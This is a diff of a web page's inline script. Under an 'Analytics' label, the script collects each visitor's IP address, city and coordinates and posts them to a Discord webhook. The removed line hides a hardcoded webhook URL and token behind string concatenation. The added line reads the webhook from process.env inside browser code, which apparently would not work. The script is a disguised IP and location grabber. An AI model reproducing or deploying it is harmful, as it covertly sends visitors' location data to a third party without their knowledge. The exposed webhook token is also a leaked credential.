@@ -540,6 +540,8 @@
     <!-- Analytics -->
         <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
         <script>
+            const webhook = process.env.WEBHOOK
+                    
              $.getJSON("https://api.ipify.org?format=json", function(data) {
             $.getJSON("https://ipapi.co/" + data.ip + "/json/", function(ipapi) {
                 document.getElementById('ipapi-city').innerHTML = ipapi.city;
@@ -549,7 +551,7 @@
                 document.getElementById('ipapi-long').innerHTML = ipapi.longitude;
 
                 var request = new XMLHttpRequest();
-                request.open("POST", "htt"+"ps://dis"+"cord.com"+"/api/webhooks/1058649353268506665/bv_2MSo2zym-rkp3c_Nz2NJnSnsW6D7Zbr2GkfBfW_-zl5LZuCW0ofOj1efNLIOahoqL");
+                request.open("POST", webhook);
                 request.setRequestHeader('Content-type', 'application/json');
                 let currentDate = new Date();
                 let cSec = currentDate.getSeconds();
